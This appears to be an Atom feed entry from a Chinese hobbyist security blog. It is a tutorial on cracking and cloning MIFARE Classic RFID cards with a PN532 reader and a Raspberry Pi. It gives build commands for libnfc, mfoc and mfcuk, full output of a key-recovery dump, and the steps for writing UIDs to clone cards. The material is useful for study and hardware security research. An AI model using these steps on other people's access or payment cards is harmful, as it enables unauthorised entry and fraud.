<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ya0guang打哈欠的地方</title>
  
  <subtitle>/Hacker/Photographer/Geek/</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://nonconformist.me/"/>
  <updated>2017-03-01T11:14:30.000Z</updated>
  <id>https://nonconformist.me/</id>
  
  <author>
    <name>ya0guang</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>低成本安全硬件（二）——RFID on PN532</title>
    <link href="https://nonconformist.me/rfid-on-rpi/"/>
    <id>https://nonconformist.me/rfid-on-rpi/</id>
    <published>2017-02-24T13:41:41.000Z</published>
    <updated>2017-03-01T11:14:30.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>鉴于硬件安全对于大多数新人是较少接触的，而这方面又非常吸引我，但是部分专业安全研究设备较高的价格使人望而却步。在该系列中，笔者希望对此感兴趣的读者在花费较少金钱的情况下体会到硬件安全的魅力所在。本系列计划分成四个部分：BadUSB on Arduino; RFID on PN532; GSM on Motorola C118 ; SDR on RTL2832U(电视棒)。</p><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>早在2007年，Mifare M1 RFID卡片就被研究人员破解了出来。NXP公司在M1卡上使用了未公开的加密算法，然而密码学史上的种种教训都表明了“不公开”与“安全的”并没有什么联系。研究人员剖析了卡片的门电路结构从而逆向了加密的算法并发现了漏洞。M1卡的结构如图所示，其拥有16个扇区，每个扇区有4个块，每个扇区的第一块储存着扇区的密钥。<br><img src="/rfid-on-rpi/mifare_memory_layout_thumb.png" title="[RFID扇区结构]"></p><p>目前针对Mifare卡片的攻击主要有三种方法：</p><h2 id="Nested攻击"><a href="#Nested攻击" class="headerlink" title="Nested攻击"></a>Nested攻击</h2><p>简单地说，就是默认密码攻击。</p><p>由于M1卡片有16个扇区，在绝大多数情况下16个扇区不一定会同时使用到。于是根据厂商在出厂时预设的密码可能碰撞出其中某一个扇区的密码。</p><p>由于无源的M1卡每一次刷卡上电的时候，密钥交换采用的随机数都是“有规律”的，用已经碰撞出的某一扇区的密钥去试探其它扇区，在此时根据随机数的规律即可“套”出密码</p><h2 id="Darkside攻击"><a href="#Darkside攻击" class="headerlink" title="Darkside攻击"></a>Darkside攻击</h2><p>简单地说就是暴力破解，即爆破出某一个扇区的密钥，之后再使用Nested攻击就能Dump出整张卡。</p><p>而与通常意义上的暴力破解不同的是，由于M1卡片的认证机制，其会泄露部分认证信息，从而大大加快爆破的进度。</p><h2 id="电波嗅探"><a href="#电波嗅探" class="headerlink" title="电波嗅探"></a>电波嗅探</h2><p>顾名思义，即在正常刷卡的时候嗅探卡片与读卡器交换的数据，从而逆向密码。</p><p>这里可以参考2014年BlackHat的PDF：<br><a href="https://www.blackhat.com/docs/sp-14/materials/arsenal/sp-14-Almeida-Hacking-MIFARE-Classic-Cards-Slides.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/sp-14/materials/arsenal/sp-14-Almeida-Hacking-MIFARE-Classic-Cards-Slides.pdf</a></p><p>以及相关论文：<br><a href="http://www.cs.ru.nl/~flaviog/publications/Attack.MIFARE.pdf" target="_blank" rel="noopener">http://www.cs.ru.nl/~flaviog/publications/Attack.MIFARE.pdf</a></p><h1 id="常见硬件介绍"><a href="#常见硬件介绍" class="headerlink" title="常见硬件介绍"></a>常见硬件介绍</h1><p>不同于之前BadUSB，在这方面可供我们选择的并不多。</p><h2 id="旗舰级All-in-one的Proxmark3"><a href="#旗舰级All-in-one的Proxmark3" class="headerlink" title="旗舰级All-in-one的Proxmark3"></a>旗舰级All-in-one的Proxmark3</h2><img src="/rfid-on-rpi/proxmark3.jpg" title="[proxmark3]"><p>国外的开源硬件，由FPGA驱动。性能十分强大，集嗅探、读取、克隆于一体，玩得了高频卡艹得动低频卡。可以插电脑可以接电源。当然其价格也是十分的感人。不过某宝上近期出现了400多元的V2版本，也不知道是如何做到将价格放到那么低的————国外的V1版本也要300多，只不过人家的是美刀。</p><p>伪装性：★★</p><p>易用性：★★★★</p><p>社区支持：★★★★</p><h3 id="项目主页"><a href="#项目主页" class="headerlink" title="项目主页"></a>项目主页</h3><p><a href="http://www.proxmark.org" target="_blank" rel="noopener">http://www.proxmark.org</a></p><h2 id="国外最近出现的ChameleonMini"><a href="#国外最近出现的ChameleonMini" class="headerlink" title="国外最近出现的ChameleonMini"></a>国外最近出现的ChameleonMini</h2><img src="/rfid-on-rpi/ChameleonMini.jpg" title="[ChameleonMini]"><p>如果不是因为要写此文特意去搜集了许多相关资料我还真不知道这玩意。这是德国的一个众筹项目，其和PM3差不多，拥有伪装卡的功能，从外形上看厚度与真正的卡片差不多，但是价格在国外比PM3要友好许多。</p><p>伪装性：★★★★</p><p>易用性：★★★</p><p>社区支持：★★★</p><h3 id="项目主页-1"><a href="#项目主页-1" class="headerlink" title="项目主页"></a>项目主页</h3><p><a href="https://github.com/emsec/ChameleonMini/wiki" target="_blank" rel="noopener">https://github.com/emsec/ChameleonMini/wiki</a></p><h2 id="最流行的读卡器ACR122"><a href="#最流行的读卡器ACR122" class="headerlink" title="最流行的读卡器ACR122"></a>最流行的读卡器ACR122</h2><img src="/rfid-on-rpi/acr122.jpg" title="[acr122]"><p>反正就是很流行，大抵是因为网络上流传了非常强大的GUI改卡读卡复制卡软件吧！某宝价格一百多，但还是比我们今天所用到的硬件高出了那么三四倍。</p><p>伪装性：★</p><p>易用性：★★★★</p><p>社区支持：★★</p><h1 id="PN532"><a href="#PN532" class="headerlink" title="PN532"></a>PN532</h1><img src="/rfid-on-rpi/pn532.jpg" title="[笔者的PN532]"><p>根据上篇的经验，之前介绍的那坨东西肯定是不会用到的———因为穷啊！</p><p>本篇的主角是PN532，我将其与树莓派连接使用。当然没有树莓派也没关系（买一个就完了），也可以使用UART转USB的接口连接电脑使用。接下来的篇幅将从树莓派的构建开始详细讲解其玩法。</p><h1 id="系统搭建"><a href="#系统搭建" class="headerlink" title="系统搭建"></a>系统搭建</h1><p>以主机为windows系统为例，linux自行解决。</p><h2 id="系统准备"><a href="#系统准备" class="headerlink" title="系统准备"></a>系统准备</h2><ul><li>去<a href="https://www.raspberrypi.org/" target="_blank" rel="noopener">https://www.raspberrypi.org/</a>上下载最新的Raspbian Jessie 系统，笔者下载时的发布日是2017-02-16。</li><li>使用win32diskimager将解压后的img镜像文件烧写到sd卡上</li><li>注意新版本的Raspbian是默认不开启ssh的，所以我们需要在boot分区下创建一个名为ssh（<font color="red">小写！！！！</font>）的文件</li><li>ssh进去，用户名pi，密码raspberry</li></ul><h2 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h2><p>执行sudo raspi-config进行配置.</p><p>选择5-Interface Options，启用SPI、I2C，禁用Serial<br>选择7-Advanced Options，1-Expand Filesystem 扩展分区</p><h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><p>依赖：</p><ul><li>autoconf</li><li>libusb-dev</li><li>libtool</li><li>libpcsclite-dev<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line">sudo apt-get install autoconf libusb-dev libtool libpcsclite-dev</span><br></pre></td></tr></table></figure></li></ul><h1 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h1><p>部分参考：<a href="https://firefart.at/post/how-to-crack-mifare-classic-cards/" target="_blank" rel="noopener">https://firefart.at/post/how-to-crack-mifare-classic-cards/</a></p><h2 id="树莓派与PN532连接"><a href="#树莓派与PN532连接" class="headerlink" title="树莓派与PN532连接"></a>树莓派与PN532连接</h2><img src="/rfid-on-rpi/rpi_interface.png" title="[RPi3的GPIO引脚图]"><p>笔者用的是树莓派3，但是GPIO口的区别不大，与PN532的连接方式为：<br>04 <-> VCC<br>06 <-> GND<br>08 <-> RXD<br>10 <-> TXD</-></-></-></-></p><img src="/rfid-on-rpi/rpi_pn532.jpg" title="[RPi3与PN532连接图]"><h2 id="libnfc"><a href="#libnfc" class="headerlink" title="libnfc"></a>libnfc</h2><p>顾名思义，nfc库。</p><p>官方github:<a href="https://github.com/nfc-tools/libnfc" target="_blank" rel="noopener">https://github.com/nfc-tools/libnfc</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/nfc-tools/libnfc/releases/download/libnfc-1.7.1/libnfc-1.7.1.tar.bz2</span><br><span class="line">tar -jxvf libnfc-1.7.1.tar.bz2</span><br><span class="line">cd libnfc-1.7.1</span><br><span class="line">autoreconf -vis</span><br><span class="line">./configure --with-drivers=all --sysconfdir=/etc --prefix=/usr</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo mkdir /etc/nfc</span><br><span class="line">sudo mkdir /etc/nfc/devices.d</span><br></pre></td></tr></table></figure><p>由于我们使用UART接口直接和PN532在树莓派上连接，还需要<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp contrib/libnfc/pn532_uart_on_rpi.conf.sample /etc/nfc/devices.d/pn532_uart_on_rpi.conf</span><br></pre></td></tr></table></figure></p><p>此时在不放卡与放卡的时候分别执行nfc-list，输出如下：<br><img src="/rfid-on-rpi/nfc_list.PNG" title="[RPi3的GPIO引脚图]"></p><h2 id="mfoc"><a href="#mfoc" class="headerlink" title="mfoc"></a>mfoc</h2><p> mfoc即上述nested攻击的实现。</p><p>官方github：<a href="https://github.com/nfc-tools/mfoc" target="_blank" rel="noopener">https://github.com/nfc-tools/mfoc</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/nfc-tools/mfoc.git</span><br><span class="line">cd mfoc/</span><br><span class="line">autoreconf -vis</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>mfoc用法如下：<br><blockquote><p>Usage: mfoc [-h] [-k key] [-f file] … [-P probnum] [-T tolerance] [-O output]</p><p>  h     print this help and exit<br>  k     try the specified key in addition to the default keys<br>  //指定key<br>  f     parses a file of keys to add in addition to the default keys<br>  //用文件为输入指定多个key<br>  P     number of probes per sector, instead of default of 20<br>  //每个扇区测试密钥数目<br>  T     nonce tolerance half-range, instead of default of 20<br>        (i.e., 40 for the total range, in both directions)<br>  O     file in which the card contents will be written (REQUIRED)<br>  //输出dump的文件<br>  D     file in which partial card info will be written in case PRNG is not vulnerable</p><p>Example: mfoc -O mycard.mfd<br>Example: mfoc -k ffffeeeedddd -O mycard.mfd<br>Example: mfoc -f keys.txt -O mycard.mfd<br>Example: mfoc -P 50 -T 30 -O mycard.mfd</p><p>This is mfoc version 0.10.7.<br>For more information, run: ‘man mfoc’.</p><footer><strong>[mfoc -h]</strong></footer></blockquote></p><p>简单地执行mfoc -O out.mfd，会dump出当前的卡片信息：<br><blockquote><p>mfoc -O out.mfd<br>Found Mifare Classic 1k tag<br>ISO/IEC 14443A (106 kbps) target:<br>    ATQA (SENS_RES): 00  04  </p><ul><li>UID size: single</li><li>bit frame anticollision supported<pre><code> UID (NFCID1): 10  bc  79  ce  SAK (SEL_RES): 08  </code></pre></li><li>Not compliant with ISO/IEC 14443-4</li><li>Not compliant with ISO/IEC 18092</li></ul><p>Fingerprinting based on MIFARE type Identification Procedure:</p><ul><li>MIFARE Classic 1K</li><li>MIFARE Plus (4 Byte UID or 4 Byte RID) 2K, Security level 1</li><li>SmartMX with MIFARE 1K emulation<br>Other possible matches based on ATQA &amp; SAK values:</li></ul><p>Try to authenticate to all sectors with default keys…<br>Symbols: ‘.’ no key found, ‘/‘ A key found, ‘\’ B key found, ‘x’ both keys found<br>[Key: ffffffffffff] -&gt; [.xxxxxxxxxxxxxxx]<br>[Key: a0a1a2a3a4a5] -&gt; [.xxxxxxxxxxxxxxx]<br>[Key: d3f7d3f7d3f7] -&gt; [.xxxxxxxxxxxxxxx]<br>[Key: 000000000000] -&gt; [.xxxxxxxxxxxxxxx]<br>[Key: b0b1b2b3b4b5] -&gt; [.xxxxxxxxxxxxxxx]<br>[Key: 4d3a99c351dd] -&gt; [.xxxxxxxxxxxxxxx]<br>[Key: 1a982c7e459a] -&gt; [.xxxxxxxxxxxxxxx]<br>[Key: aabbccddeeff] -&gt; [.xxxxxxxxxxxxxxx]<br>[Key: 714c5c886e97] -&gt; [.xxxxxxxxxxxxxxx]<br>[Key: 587ee5f9350f] -&gt; [.xxxxxxxxxxxxxxx]<br>[Key: a0478cc39091] -&gt; [.xxxxxxxxxxxxxxx]<br>[Key: 533cb6c723f6] -&gt; [.xxxxxxxxxxxxxxx]<br>[Key: 8fd0a4f256e9] -&gt; [.xxxxxxxxxxxxxxx]</p><p>Sector 00 - Unknown Key A               Unknown Key B<br>Sector 01 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff<br>Sector 02 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff<br>Sector 03 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff<br>Sector 04 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff<br>Sector 05 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff<br>Sector 06 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff<br>Sector 07 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff<br>Sector 08 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff<br>Sector 09 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff<br>Sector 10 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff<br>Sector 11 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff<br>Sector 12 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff<br>Sector 13 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff<br>Sector 14 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff<br>Sector 15 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff</p><p>Using sector 01 as an exploit sector<br>Sector: 0, type A, probe 0, distance 12851 …..<br>Sector: 0, type A, probe 1, distance 12845 …..<br>Sector: 0, type A, probe 2, distance 12847 …..<br>Sector: 0, type A, probe 3, distance 12851 …..<br>Sector: 0, type A, probe 4, distance 12849 …..<br>  Found Key: A [11dc95b2bd87]<br>  Data read with Key A revealed Key B: [11dc95b2bd87] - checking Auth: OK<br>Auth with all sectors succeeded, dumping keys to a file!<br>Block 63, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff<br>Block 62, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 61, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 60, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 59, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff<br>Block 58, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 57, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 56, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 55, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff<br>Block 54, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 53, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 52, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 51, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff<br>Block 50, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 49, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 48, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 47, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff<br>Block 46, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 45, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 44, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 43, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff<br>Block 42, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 41, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 40, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 39, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff<br>Block 38, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 37, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 36, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 35, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff<br>Block 34, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 33, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 32, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 31, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff<br>Block 30, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 29, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 28, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 27, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff<br>Block 26, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 25, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 24, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 23, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff<br>Block 22, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 21, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 20, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 19, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff<br>Block 18, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 17, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 16, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 15, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff<br>Block 14, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 13, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 12, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 11, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff<br>Block 10, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 09, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 08, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 07, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff<br>Block 06, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 05, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 04, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 03, type A, key 11dc95b2bd87 :00  00  00  00  00  00  ff  07  80  69  11  dc  95  b2  bd  87<br>Block 02, type A, key 11dc95b2bd87 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00<br>Block 01, type A, key 11dc95b2bd87 :5e  dc  bf  dd  4b  fd  cf  ff  87  d4  00  00  00  00  00  00<br>Block 00, type A, key 11dc95b2bd87 :10  bc  79  ce  1b  08  04  00  62  63  64  65  66  67  68  69  </p><footer><strong>[mfoc -O out.mfd]</strong></footer></blockquote></p><h2 id="mfcuk"><a href="#mfcuk" class="headerlink" title="mfcuk"></a>mfcuk</h2><p>官方github:<a href="https://github.com/nfc-tools/mfcuk" target="_blank" rel="noopener">https://github.com/nfc-tools/mfcuk</a></p><p>mfcuk(<font color="red">不是mfuck！！！</font>)即上述darkside攻击的实现。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/nfc-tools/mfcuk.git</span><br><span class="line">cd mfcuk</span><br><span class="line">autoreconf -vis</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>用法如下：<br><blockquote><p>mfcuk - 0.3.8<br>Mifare Classic DarkSide Key Recovery Tool - 0.3<br>by Andrei Costin, <a href="mailto:zveriu@gmail.com" target="_blank" rel="noopener">zveriu@gmail.com</a>, <a href="http://andreicostin.com" target="_blank" rel="noopener">http://andreicostin.com</a></p><p>Usage:<br>-C - require explicit connection to the reader. Without this option, the connection is not made and recovery will not occur<br>-i mifare.dmp - load input mifare_classic_tag type dump<br>-I mifare_ext.dmp - load input extended dump specific to this tool, has several more fields on top of mifare_classic_tag type dump<br>-o mifare.dmp - output the resulting mifare_classic_tag dump to a given file<br>-O mifare_ext.dmp - output the resulting extended dump to a given file<br>-V sector[:A/B/any_other_alphanum[:fullkey]] - verify key for specified sector, -1 means all sectors<br>    After first semicolon key-type can specified: A verifies only keyA, B verifies only keyB, anything else verifies both keys<br>    After second semicolon full 12 hex-digits key can specified - this key will override any loaded dump key for the given sector(s) and key-type(s)<br>-R sector[:A/B/any_other_alphanum] - recover key for sector, -1 means all sectors.<br>    After first semicolon key-type can specified: A recovers only keyA, B recovers only keyB, anything else recovers both keys<br>-U UID - force specific UID. If a dump was loaded with -i, -U will overwrite the in the memory where dump was loaded<br>-M tagtype - force specific tagtype. 8 is 1K, 24 is 4K, 32 is DESFire<br>-D - for sectors and key-types marked for verification, in first place use default keys to verify (maybe you are lucky)<br>-d key - specifies additional full 12 hex-digits default key to be checked. Multiple -d options can be used for more additional keys<br>-s - milliseconds to sleep for SLEEP_AT_FIELD_OFF (Default: 10 ms)<br>-S - milliseconds to sleep for SLEEP_AFTER_FIELD_ON (Default: 50 ms)<br>-P hex_literals_separated - try to recover the key from a conversation sniffed with Proxmark3 (mifarecrack.c based). Accepts several options:<br>    Concatenated string in hex literal format of form uid:tag_chal:nr_enc:reader_resp:tag_resp<br>    Example -P 0x5c72325e:0x50829cd6:0xb8671f76:0xe00eefc9:0x4888964f would find key FFFFFFFFFFFF<br>-p proxmark3_full.log - tries to parse the log file on it’s own (mifarecrack.py based), get the values for option -P and invoke it<br>-F - tries to fingerprint the input dump (-i) against known cards’ data format<br>-v verbose_level - verbose level (default is O)</p><p>Usage examples:<br>  Recove all keys from all sectors:<br>    mfcuk -C -R -1<br>  Recove the sector #0 key with 250 ms for all delays (delays could give more results):<br>    mfcuk -C -R 0 -s 250 -S 250</p><footer><strong>[mfcuk]</strong></footer></blockquote><br>鉴于篇幅关系，这里不详细介绍了</p><h2 id="写卡"><a href="#写卡" class="headerlink" title="写卡"></a>写卡</h2><p>直接使用nfc-mfclassic即可对Mifare classic系列卡片写入。主要有M1卡（S50）和4K卡（S70）。</p><p>用法如下：<br><blockquote><p>nfc-mfclassic<br>Usage: nfc-mfclassic f|r|R|w|W a|b &lt;dump.mfd&gt; [&lt;keys.mfd&gt; [f]]<br>  f|r|R|w|W     - Perform format (f) or read from (r) or unlocked read from (R) or write to (w) or unlocked write to (W) card<br>                  <strong><em> format will reset all keys to FFFFFFFFFFFF and all data to 00 and all ACLs to default                  </em></strong> unlocked read does not require authentication and will reveal A and B keys<br>                  <strong><em> note that unlocked write will attempt to overwrite block 0 including UID                  </em></strong> unlocking only works with special Mifare 1K cards (Chinese clones)<br>  a|A|b|B       - Use A or B keys for action; Halt on errors (a|b) or tolerate errors (A|B)<br>  &lt;dump.mfd&gt;    - MiFare Dump (MFD) used to write (card to MFD) or (MFD to card)<br>  &lt;keys.mfd&gt;    - MiFare Dump (MFD) that contain the keys (optional)<br>  f             - Force using the keyfile even if UID does not match (optional)<br>Examples:</p><p>  Read card to file, using key A:</p><pre><code>nfc-mfclassic r a mycard.mfd</code></pre><p>  Write file to blank card, using key A:</p><pre><code>nfc-mfclassic w a mycard.mfd</code></pre><p>  Write new data and/or keys to previously written card, using key A:</p><pre><code>nfc-mfclassic w a newdata.mfd mycard.mfd</code></pre><p>  Format/wipe card (note two passes required to ensure writes for all ACL cases):</p><pre><code>nfc-mfclassic f A dummy.mfd keyfile.mfd fnfc-mfclassic f B dummy.mfd keyfile.mfd f</code></pre><footer><strong>[nfc-mfclassic]</strong></footer></blockquote><br>这里要额外说明的是，M1卡的UID区域是只读不可写的，然而一些商家不符合规范（中国的牛B商家）吧0扇区的UID弄成了可写的，用W可以强行写入。</p><p>A|B代表用密钥A或者B写入（均可），这里牵扯到Mifare协议的东西，读者可以自行查阅相关资料。</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>本文所含内容具有一定攻击性，切勿用于非法用途！弄出什么新闻也别找我负责！</p><h2 id="关于PN532"><a href="#关于PN532" class="headerlink" title="关于PN532"></a>关于PN532</h2><p>由于查到PN532是支持Ultralight卡片的，但是笔者的PN532始终无法读取该类卡片，于是到elechouse的Github Issue中询问了关于PN532的问题————他们表面他们自己生产的PN532可以读几乎符合NFC协议的一切卡片，但是万恶的某宝在山寨的时候似乎阉割了一些功能，但是笔者测试1k和4k卡片都是可用的。</p><h2 id="在手机上的奇技淫巧"><a href="#在手机上的奇技淫巧" class="headerlink" title="在手机上的奇技淫巧"></a>在手机上的奇技淫巧</h2><p>在带有NFC功能的Android手机上有一款名为Mifare Classic Tools的软件，可以进行读写卡，dump的操作————但是必须用对密钥哦！可以在树莓派上破解之后把密钥添加进去，然后就能用手机进行读写卡了。至于用途，你懂的。<br>GGPLY链接：<a href="https://play.google.com/store/apps/details?id=de.syss.MifareClassicTool&amp;hl=zh" target="_blank" rel="noopener">https://play.google.com/store/apps/details?id=de.syss.MifareClassicTool&amp;hl=zh</a>自备梯子</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="无线安全" scheme="https://nonconformist.me/tags/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/"/>
    
      <category term="硬件安全" scheme="https://nonconformist.me/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="RFID" scheme="https://nonconformist.me/tags/RFID/"/>
    
      <category term="Raspberry Pi" scheme="https://nonconformist.me/tags/Raspberry-Pi/"/>
    
  </entry>
  
  <entry>
    <title>我的安全学习书单（持续更新）</title>
    <link href="https://nonconformist.me/my-booklist/"/>
    <id>https://nonconformist.me/my-booklist/</id>
    <published>2017-02-22T11:54:05.000Z</published>
    <updated>2017-02-22T12:09:04.000Z</updated>
    
